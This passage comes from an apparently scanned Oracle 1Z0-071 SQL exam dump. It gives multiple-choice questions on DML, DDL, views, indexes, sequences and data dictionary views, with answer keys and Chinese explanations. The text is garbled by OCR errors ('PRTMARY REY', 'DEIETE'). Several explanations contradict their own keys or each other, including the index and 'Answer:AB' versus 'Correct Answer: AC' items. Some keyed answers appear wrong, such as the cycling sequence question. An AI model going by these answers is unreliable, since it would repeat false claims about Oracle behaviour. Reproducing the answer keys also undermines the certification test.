VALUES（1，&apos;10-mar-2007，&apos;online&apos;，1000）； Correct Answer: CD Explanation/Reference: 考点：DML语句 create table orders (order_id number(12) not null,order_date timestamp(6) not null,order_mode varchar2(8) default &apos;direct&apos;,customer_id number(6) not null,order_taotal number(8,2) default 0); QUESTION 2 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which statement is true? A. It executes successfully and the row is inserted with a null PUBLISHERID. B. It executes successfully only if NULL is explicity specified in the INSERT statement C. It executes successfully only if the PUBLISHER ID column name is added to the columns list in the INSERT statement. D. It executes successfully only if the PUBLISHER ID column name is added to the columns list and NUuL is explicitly specified in the INSERT statement Correct Answer: A Explanation/Reference: 考点：DML语句 insert 语句没有指定publisher_id的值，则为null QUESTION 3 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 You want to delete rows from the SALES table，where the PROMO NAME column in the PROMOTIONS table has either blowout sale or everyday low price as values. Which three DELETE statements are valid？ A. DELETE FROM sales WHERE promo_id=（SELECT promo_id FROM promotions WHERE promo name=&apos;blowout sale’） AND promo id=（SELECT promo id FROM promotions WHERE promo name=&apos;everyday low price&apos;）； B. DELETE FROM sales WHERE promo id（SELECT promo id FROM promotions WHERE promo name&apos;blowout sale&apos;） OR promo id=（SELECT promo id FROM promotions WHERE promo name&apos;everyday low pricet）； C. DELETE FROM sales WHERE promo id IN（SELECT promo id FROM promotions WHERE promo name=&apos;blowout sale&apos; OR promo name =&apos;everyday low price&apos;）： D. DEIETE FROм sales WHERE promo_id IN（SELECT promo id FROM promotions WHERE promo name IN（&apos;blowout sale&apos;，&apos;everydaylow price&apos;））； Correct Answer: BCD Explanation/Reference: 考点：DML delete语句中where条件中时或者的关系，因此排除A QUESTION 4 Which statement is true about the Orade SQL, DELETE and TRONCATE statements? A. DELETE and TRUNCATE statements can have a rollback done to restore data into a table B. DELETE and TRUNCATE statements remove all indexes for the tables on which they are performed. C. DEIETE but not TRUNCATE statement can be used to remove data from selective columns and rows of a table. D. DELETE but not TRUNCATE statement can be used to selectively remove rows from a table Correct Answer: D Explanation/Reference: 考点：DML语句 DELETE and TRUNCATE A 错 detele 可以回滚 truncate 不能回滚 B 错索引不会删除 C 错 DEIETE不能删除指定的列。 D 对可以使用 DELETE而不是TRUNCATE语句有选择地从表中删除行 QUESTION 5 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which three are true about multitable INSERT statements? A. They can insert each computed row into more than one table. B. They can be performed on views. C. They can be performed on relational tables. D. They can be performed on external tables using SQL*Loader. E. They can be performed only by using a subquery. F. They can be performed on remote tables. Correct Answer: AEF Explanation/Reference: 考点：多表插入 分析：AEF多表插入语法： INSERT ALL [insert_into_value][values_clause] (subquery) SQL&gt;insert all into t1 into t2 select * from t; （无条件 insert all) SQL&gt; insert all when x&gt;=3 then into t1 when x&gt;=2 then into t2 select * from t; （有条件insert all)。 A 对有条件多表插入 B 错视图不适用复杂的表 C 错外键可以重复可以空值。多表插入有约束 D 错外部表不能 DML E 对语法 select F 对可以 @ QUESTION 6 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which two are true about multitable INSERT statements? A. They always use subqueries. B. They can transform a row from a source table into multiple rows in a target table. C. The conditional INSERT FRIST statement always inserts a row into a single table. D. The unconditional INSERT ALL statement must have the same number of columns in both the source and target tables. E. The conditional INSERT ALL statement inserts rows into a single table by aggregating source rows. Correct Answer: AB Explanation/Reference: 考点：多表插入 关于多表插入语句，哪两个是正确的? They can transform a row from a source table into multiple rows in a target table. 它们可以将源表中的一行转换为目标表中的多行。 They always use subqueries. 它们总是使用子查询。 QUESTION 7 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which three actions can you perform on an existing table containing data? A. Add a new NOT NULL column with a DEFAULT value. B. Change the default value of a column. C. Add a new column as the table`s first column. D. Change a DATE column containing data to a NUMBER data type. E. Define a default value that is automatically inserted into a column containing nulls. F. Increase the width of a numeric column. Correct Answer: ABF Explanation/Reference: 考点：DML操作分析 ABF A 对可以添加数据类型 B 对可以更改数据类型 C 错 oracle 不支持调整列顺序 D 错数字改字符就可以。反过来不行 E 错更改列类型，只会操作新数据，旧数据不变 F 对可以改变数据类型 QUESTION 8 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which three are true about the MERGE statement? A. It can update the same row of the target table multiple times. B. It can combine rows from multiple tables conditionally to insert into a single table. C. It can update,insert,or delete rows conditionally in multiple tables. D. It can use subqueries to produce source rows. E. It can use views to produce source rows. F. It can merge rows only from tables. Correct Answer: BDE Explanation/Reference: 考点：MERGE A 错匹配到只能操作一次 B 对 using 支持多个表 C 错不支持 delete D 对支持子查询多表查询联合查询 E 对支持视图 F 错 view 也可以 QUESTION 9 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which two statements are true about TRUNCATE and DELETE? A. The result of a DELETE can be undone by issuing a ROLLBACK. B. DELETE can use a WHERE clause to determine which row(s) should be removed. C. TRUNCATE can use a WHERE clause to determine which row(s) should be removed. D. TRUNCATE leavers any indexes on the table in an UNUSABLE state. E. The result of a TRUNCATE can be undone by issuing a ROLLBACK. Correct Answer: AB Explanation/Reference: 考点：DML语句 A 对 delete 是 DML可以回滚 B 对 delete 可用子查询 C 错 truncate 是 DDL，不能 where D 错 truncate 将水线，index 扫描水线以下 E 错 truncate 是 DDL，自动提交 QUESTION 10 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 View the Exhibit and examine the description of the tables. Which three statements are true? A. A customer can exist in many countries. B. The statement will fail if a row already exists in the SALES table for product 23. C. The statement will fail because a subquery may not be contained in a VALUES clause. D. The SALES table has five foreign keys. E. The statement will execute successfully and a new row will be inserted into the SALES table. F. A product can have a different unit price at different times. Correct Answer: DEF Explanation/Reference: 分析： A 错一个客户属于一个城市，一个城市可以住着多个人。 B 错销售 salse表中的prod_id 多个对应价格对应一个产品。因此salse表中的prod_id不是唯一的。 C 错子查询是空值也插入 D 对看图数出关联的线条为 5 E 对外键唯一 F 对一对多 QUESTION 11 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which three statements are true about performing Data Manipulation Language (DML) operations on a view in an Oracle Database? A. Insert statements can always be done on a table through a view. B. Views cannot be used to query rows from an underlying table if the table has a PRIMARY KEY and the PRIMARY KEY columns are not referenced in the defining query of the view. C. The WITH CHECK clause has no effect when deleting rows from the underlying table through the view. D. Views cannot be used to add or modify rows in an underlying table if the defining query of the view contains the DISTINCT keyword. E. Views cannot be used to add or modify rows in an underlying table if the defining query of the view contains aggregating functions. F. Views cannot be used to add rows to an underlying table if the table has columns with NOT NULL constraints lacking default values which are not referenced in the defining query of the view. Correct Answer: CDE Explanation/Reference: 分析:CDE CDE 复杂的操作不适用于 view A 错 always如果 view 只有一列，原表有多列，插入多列会报错。 B 错主键不影响 F 错默认值不影响 view 添加行 QUESTION 12 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Examine the description of the PRODUCTS table: You successfully execute this command: CREATE TABLE new_prices (prod id NUMBER (2), price NUMBER (8, 2)); Which two statements execute without errors? A. MERGE INTO new_prices n USING (SELECT * FROM products) p WHEN MATCHED THEN UPDATE SET n.price = p.cost*.01 WHEN NOT MATCHED THEN INSERT (n.prod_id, n.price) VALUES (p.prod_id, cost*.01) WHERE (p.cost &lt; 200); B. MERGE INTO new_prices n USING (SELECT * FROM products WHERE cost &gt; 150) p ON (n.prod_id = p.prod_id) WHEN MATCHED THEN DELETE WHERE (p.cost &lt; 200) WHEN NOT MATCHED THEN INSERT (n.prod_id, n.price) VALUES (p.prod_id, cost*.01) WHERE (p.cost &lt; 200); C. MERGE INTO new_prices n USING (SELECT * FROM products WHERE cost &gt; 150) p ON (n.prod_id = p.prod_id) WHEN MATCHED THEN UPDATE SET n.price = p.cost*.01 DELETE WHERE (p.cost &lt; 200); D. MERGE INTO new_prices n USING products p ON (n.prod_id = p.prod_id) WHEN NOT MATCHED THEN INSERT (n.prod_id, n.price) VALUES (p.prod_id, cost*.01) WHERE (p.cost &lt; 200); Correct Answer: CD Explanation/Reference: 考点：MERGE A 错 ORA-00969: missing ON keyword。缺少 ON 条件。 B 错 ORA-00905: missing keyword。只能 update 或者 insert CD 可以输出 merge into的形式： MERGE INTO [target-table] A USING [source-table sql] B ON([conditional expression] and [...]...) WHEN MATCHED THEN [UPDATE sql] WHEN NOT MATCHED THEN [INSERT sql] QUESTION 13 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which two statements are true about conditional INSERT ALL? A. Each row returned by the subquery can be inserted into only a single target table. B. It cannot have an else clause C. The total number of rows inserted is always equal to the number of rows returned by the subquery. D. A single WHEN condition can be used for multiple into clauses, E. Each WHEN condition is tested for each row returned by the subquery. Correct Answer: DE Explanation/Reference: 分析：DE D 对 case 语句 E 对 case 语句 QUESTION 14 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 The orders table has a primary key constraint on the order_id column. The order_items table has a foreign key constraint on the order_id column, referencing the primary Key of the orders table. The constraint is defined with on delete cascade. There are rows in the orders table with an order_total of less than 1000 Which three delete statements execute successfully? A. delete from orders where order_total &lt; 1000 B. delete * from orders where order_total &lt; 1000 C. delete orders where order_total &lt; 1000 D. delete from orders E. delete order_id from orders where order_total &lt; 1000 Correct Answer: ACD Explanation/Reference: Delte [from] table_name where … From可以没有。 Exam H DDL管理5大对象 QUESTION 1 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which two statements are true about Oracle synonyms? A. A synonym can have a synonym. B. All private synonym names must be unique in the database. C. Any user can create a PUBLIC synonym. D. A synonym can be created on an object in a package. E. A synonym has an object number. Correct Answer: AE Explanation/Reference: 考点：同义词关于Oracle同义词，哪两个说法是正确的? A synonym can have a synonym. 同义词可以有同义词。真确 All private synonym names must be unique in the database. 所有私有同义词名称在数据库中必须是唯一的。错误 Any user can create a PUBLIC synonym. 任何用户都可以创建一个公共同义词。错误 A synonym can be created on an object in a package. 可以在包中的对象上创建同义词。错误 A synonym has an object number. 同义词有一个对象号。正确 QUESTION 2 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which three statements are true about indexes and their administration in an oracle database? A. An INVISIBLE index is not maintained when Data Manipulation Language (DML) is performed on its underlying table. B. An index can be created as part of a CREATE TABLE statement C. A DROP INDEX statement always prevents updates to the table during the drop operation. D. A UNIOUE and non-unique index can be created on the same table column. E. A descending index is a type of function-based index F. It a query filters on an indexed column then it will always be used during execution of the query Correct Answer: BCE Explanation/Reference: 考点：索引 分析:BCE INVISIBLE index 不可见索引，维护但不使用 LOCK TABLE FOR INDEX &quot;LIXIA&quot;.&quot;IDX_TEST_ID&quot; IN SHARE MODE NOWAIT A 错 B 对 create table using index 自动建索引需要唯一或主键 C 对主键基于索引。 DDL会锁表 D 错同一个列不能存在多个索引； E 对降序索引 F 错索引不一定有用 关于oracle数据库中的索引及其管理，哪三个语句是正确的? A) An INVISIBLE index is not maintained when Data Manipulation Language (DML) is performed on its underlying table. 在数据操作语言(DML)的底层表上执行时，不维护不可见的索引。 错误，不可见索引，维护但不使用 B) An index can be created as part of a CREATE TABLE statement索引可以作为CREATE TABLE语句的一部分创建 正确。 C) A DROP INDEX statement always prevents updates to the table during the drop operation. DROP索引语句总是在DROP操作期间阻止对表的更新。 错误。 D) A UNIOUE and non-unique index can be created on the same table column.可以在同一表列上创建UNIOUE和非唯一索引。正确 E) A descending index is a type of function-based index 降序索引是一种基于函数的索引正确 F) It a query filters on an indexed column then it will always be used during execution of the query 它是索引列上的查询过滤器，然后在查询执行期间始终使用它 QUESTION 3 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which three statements are true about views in an Oracle Database? A. A SELECT statement cannot contain a WHERE clause when querying a view containing a WHERE clause in its defining query. B. Rows inserted into a table using a view are retained in the table if the view is dropped. C. Views can join tables only if they belong to the same schema. D. Views have no segment. E. Views have no object number F. A view can be created that refers to a non-existent table in its defining query. Correct Answer: BDF Explanation/Reference: 考点：视图分析：BDF 关于Oracle数据库中的视图，哪三个陈述是正确的? A) A SELECT statement cannot contain a WHERE clause when querying a view containing a WHERE clause in its defining query. 当查询一个包含WHERE的视图时，SELECT语句不能包含WHERE子句的定义查询。 错误，可以包含where子句。 Rows inserted into a table using a view are retained in the table if the view is dropped. B)如果视图被删除，使用视图插入到表中的行将保留在表中。正确 Views can join tables only if they belong to the same schema. C)视图只有在属于同一个schema时才能联接表。错误 Views have no segment. D) 视图没有段。正确 Views have no object number E)视图没有对象编号错误 A view can be created that refers to a non-existent table in its defining query. F) 可以创建在其定义查询中引用不存在的表的视图。正确，可以通过 create force view QUESTION 4 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Examine the description of the PRODUCT_DETAILS table: Which two statements are true? A. PRODUCT_ID can be assigned the PRTMARY REY constraint: B. EXPTRY_DATE cannot be used in arithmetic expressions. C. EXPTRY_DATE contains the SYSDATE by default if no date is assigned to it. D. PRODUCT_ PRICE can be used in an arithmetic expression even if it has no value stored in it. E. PRODUCT_ PRICE contains the value zero by default if no value is assigned to it F. PRODUCT_ NAME cannot contain duplicate values Correct Answer: AD Explanation/Reference: 考点：数据类型 PRODUCT_ID can be assigned the PRTMARY REY constraint 正确，可以作主键 EXPTRY_DATE cannot be used in arithmetic expressions. 错，日期可以做加减法 EXPTRY_DATE contains the SYSDATE by default if no date is assigned to it. 错，日期型的列可以没有默认值、 PRODUCT_ PRICE can be used in an arithmetic expression even if it has no value stored in it. 正确，日期型的列即使没有为空也能进行算数运算。 PRODUCT_ PRICE contains the value zero by default if no value is assigned to it 错，该列没有设置默认值0 PRODUCT_ NAME cannot contain duplicate values 错，该列没有唯一键的约束，可以重复 QUESTION 5 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which three are true about the CREATE TABLE command? A. It can include the CREATE..INDEX statement for creating an index to enforce the primary key constraint. B. The owner of the table should have space quotas available on the tablespace where the table is defined. C. It implicitly executes a commit. D. It implicitly rolls back any pending transactions. E. A user must have the CREATE ANY TABLE privilege to create tables. F. The owner of the table must have the UNLIMITED TABLESPACE System privilege. Correct Answer: ABC Explanation/Reference: 考点：DDL语句 create table分析：ABC It can include the CREATE..INDEX statement for creating an index to enforce the primary key constraint.对 using index 自动创建索引需要主键或唯一 The owner of the table should have space quotas available on the tablespace where the table is defined. 对建表需要有空间 It implicitly executes a commit. 对 create table 是 DDL。隐式提交 It implicitly rolls back any pending transactions. 错没有回滚功能 A user must have the CREATE ANY TABLE privilege to create tables. 错 create any table 是在其他用户模式建表 The owner of the table must have the UNLIMITED TABLESPACE System privilege. 错不需要 unlimited，够用就可以 QUESTION 6 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which three statements are true about dropping and unused columns in an oracle database? A. A primary key column referenced by another column as a foreign key can be dropped if using the CASCADE option. B. A DROP COLUMN command can be rolled back C. An UNUSED column&apos;s space is reclaimed automatically when the block containing that column is next queried. D. An UNUSED column&apos;s space is reclaimed automatically when the row containing that column is next queried. E. Partition key columns cannot be dropped F. A column that is set to UNUSED still counts towards the limit of 1000 columns per table Correct Answer: AEF Explanation/Reference: 关于在oracle数据库中删除和未使用的列，哪三个语句是正确的? A primary key column referenced by another column as a foreign key can be dropped if using the CASCADE option. 如果使用CASCADE选项，另一列作为外键引用的主键列可以被删除。对 A DROP COLUMN command can be rolled back 可以回滚DROP列命令错 An UNUSED column&apos;s space is reclaimed automatically when the block containing that column is next queried. 当下次查询包含该列的块时，将自动回收未使用列的空间。错 An UNUSED column&apos;s space is reclaimed automatically when the row containing that column is next queried. 当下次查询包含该列的行时，将自动回收未使用列的空间。错 Partition key columns cannot be dropped 不能删除分区键列对 A column that is set to UNUSED still counts towards the limit of 1000 columns per table 设置为未使用的列仍然按每个表1000列的限制计数对 QUESTION 7 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Examine the structure proposed for the TRANSACTIONS table: name Null Type TRANS_ID NOT NULL NUMBER(6) CUST_NAME NOT NULL VARCHAR2(20) CUST_STATUS NOT NULL VARCHAR2 TRANS_DATE NOT NULL DATE TRANS_VALIDITY INTERVAL DAY TO SECOND CUST_CREDIT_VALUE NUMBER(10) A. The TRANS_DATE column would allow storage of dates only in the dd-mon-yyyy format. B. The CUST_CREDIT_VALUE column would allow storage of positive and negative integers. C. The TRANS_VALIDITY column would allow storage of a time interval in days, hours, minutes, and seconds. D. The CUST_STATUS column would allow storage of data up to the maximum VARCHAR2 size of 4,000 characters. Correct Answer: BC Explanation/Reference: 考点：数据类型 A: TRANS_DATE字段只能存储如dd-mon-yyyy格式的数据。（错误，Date数据类型可以精确的秒，如dd-mon-yyyy HH24:MI:SS) B: CUST_CREDIT_VALUE字段能存储正整数和负整数。（正确） C: TRANS_VALIDITY字段能存储包含天、小时、分钟、秒的时间段（正确） D: CUST_STATUS 字段昀大能存储4000个字符。（错误，没有指定昀大值，会报错） QUESTION 8 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which CREATE TABLE statement is valid? A. CREATE TABLE ord details (ord_no NUMBER (2) PRIMARY KEY, Item_no NUMBER (3) PRIMARY REY, Ord_date DATE NOT NULL); B. CREATE TABLE ord details (ord no NUMBER (2) UNIQUE, NOT NULL, item no NUMBER (3), ord date DATE DEFAULT SYSDATE NOT NULL); C. CREATE TABLE ord details (ord no NUMBER (2) item no NUMBER (3), ord date DATE DEFAULT NOT NULL, CONSTRAINT ord uq UNIQUE (ord no) , CONSTRAINT ord pk PRIMARY REY (ord no)); D. CREATE TABLE ord details (ord no NUMBER (2), item no NUMBER (3) , ord date DATE DEFAULT SYSDATE NOT NULL, CONSTRAINT ord pk PRIMARY KEY (ord no, item no) ); Correct Answer: D Explanation/Reference: 考点：DDL语句 A 错 PRIMARY KEY只能由一个 B 错 UNIQUE, NOT NULL不能有逗号 C 错同一个列不能存在两个索引 D 对 QUESTION 9 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 What is the primary difference between the relational database (RDB) and object-oriented database (OODB) models? A. OODB supports multiple objects in the same database, whereas RDB supports only tables. B. RDB supports E.F. Codd&apos;s rules, whereas OODB does not support them C. OODB incorporates methods with data structure definition, whereas RDB does not allow this. D. RDB allows the definition of relationships between different tables, whereas OODB does not allow this. Correct Answer: B Explanation/Reference: 考点：数据库模型 关系型数据库(RDB)和面向对象数据库(OODB)模型之间的主要区别是什么? A) RDB允许定义不同表之间的关系，而OODB允许定义不同表之间的关系不允许这样。 B) OODB结合了数据结构定义的方法，而RDB没有允许这个。 C) OODB支持同一个数据库中的多个对象，而RDB只支持表。 D) RDB支持E.F. Codd的规则，而OODB不支持它们。 QUESTION 10 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Identify two reasons for the error. A. Only one LONG column can be used per table. B. FOREIGN KEY defined on the DEPT ID column must be at the table level only. C. The NOT NULL constraint on the ENAME column must be defined at the column level. D. The PRIMARY REY constraint in the EMP ID column must have a name and must be defined at the table level only E. The FOREIGN KEY keyword is missing in the constraint definition. Answer:AB Correct Answer: AC Explanation/Reference: 考点：DDL create 语法 QUESTION 11 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which two statements are true？（Choose two.） A. DICTIONARY is a view that contains the names of all the data dictionary views that the user can access. B. The user SYSTEM owns all the base tables and user-accessible views of the data dictionary. C. All the dynamic performance views prefixed with v$ are accessible to all the database users. D. The USER_OBJECTS view can provide information about the tables and views created by the user who queries the view. E. The USER_SYNONYMS view can provide information about private synonyms. Correct Answer: DE Explanation/Reference: A dict 包含所有用户能够访问的数据字典视图，但是有些 dba 打头的是普通用户不能访问的。有些人认为 A是对的，但是说法有漏洞。 B. system 用户是操作系统管理员，sys 才是数据库管理员，数据字典的所有基表和视图都属于 sys用户。 C. v$为前缀的动态性能视图要有 DBA权限才能访问。 QUESTION 12 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Evaluate the following CREATE SEQUENCE statement: CREATE SEQUENCE seq1 START WITH 100 INCREMENT BY 10 MAXVALUE 200 CYCLE NOCACHE; The sequence seq1 has generated numbers up to the maximum limit of 200. You issue the following SQL statement SELECT seq1.nextval FROM dual; What is displayed by the SELECT statement? A. 1 B. 10 C. 100 D. an error Correct Answer: C Explanation/Reference: 考点：序列 QUESTION 13 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which three tasks can be performed by DDL statements？ A. preventing data retrieval from a table outside of office hours B. modifying a table to prevent data that violate certain conditions from being entered in a column C. preventing any data modification to a table D. creating multiple savepoints to enable partial rollback of a transaction E. providing an alternative name for a table Correct Answer: BCE Explanation/Reference: 考点：DDL语句 DDL语句可以执行哪三个任务? B 答案可以用添加约束来解决; C 答案可以用 alter 命令把表变成只读模式; E 答案可以通过创建同义词来实现，这道题比较灵活，表达的比较隐晦。 QUESTION 14 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 The command to create a table fails. Identify the reason for the SQL statement failure A. You cannot use SYSDATE in the condition of a CHECK constraint. B. You cannot use the BETWEEN dause in the condition of a CHECR constraint. C. You cannot use the NEXTVAL sequence value as a DEFAULT value for a column. D. You cannot use ORD No and ITEM NO columns as a composite primary key because ORD No is also the FOREIGN REY. Correct Answer: A Explanation/Reference: 考点：DDL建表语句失败的原因: check中不能使用 sysdate QUESTION 15 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 You execute the following command SQL&gt; ALTER TABLE departments SET UNUSED(country); Which two statements are true？ A. Synonyms existing on the DEPARTMENTS table would have to be re-created B. Unique key constraints defined on the COUNTRY column are removed. C. Views created on the DEPARTMENTS table that indude the COUNTRY column are automatically modified and remain valid. D. Indexes created on the coUNTRY column exist until the DROP UNUSED COLUMNS command is executed. E. A new column,COUNTRY,can be added to the DEPARTMENTS table after executing the command Correct Answer: BE Explanation/Reference: 考点：unused Unique key constraints defined on the COUNTRY column are removed. 删除在COUNTRY列上定义的唯一键约束。 A new column,COUNTRY,can be added to the DEPARTMENTS table after executing the command可以将新的列COUNTRY添加到department表中. QUESTION 16 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which statement is true regarding the SESSION_PRIVS dictionary view? A. It contains the current object privileges available in the user session B. It contains the current system privileges available in the user session. C. It contains the object privileges granted to other users by the current user session D. It contains the system privileges granted to other users by the current user session. Correct Answer: B Explanation/Reference: 考点：数据字典关于SESSION_PRIVS字典视图，哪个说法是正确的? It contains the current system privileges available in the user session. 它包含用户会话中可用的当前系统特权。 以下语句查询session_privs数据字典视图： SQL&gt; select * from session_privs; PRIVILEGE ALTER SYSTEM AUDIT SYSTEM CREATE SESSION ALTER SESSION RESTRICTED SESSION CREATE TABLESPACE ALTER TABLESPACE MANAGE TABLESPACE DROP TABLESPACE UNLIMITED TABLESPACE CREATE USER BECOME USER ... ... 官方文档对session_privs的描述是： SESSION_PRIVS describes the privileges that are currently available to the user. 并没有说是系统权限还是对象权限，通过上面的查询结果可以知道这些都是系统权限，而不是对象级别的权限 QUESTION 17 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which two statements are true regarding views？（Choose two.） A. A simple view in which column aliases have been used cannot be updated. B. A subquery used in a complex view definition cannot contain group functions or joins C. Rows cannot be deleted through a view if the view definition contains the DISTINcT keyword. D. Rows added through a view are deleted from the table automatically when the view is dropped. E. The OR REPLACE option is used to change the definition of an existing view without 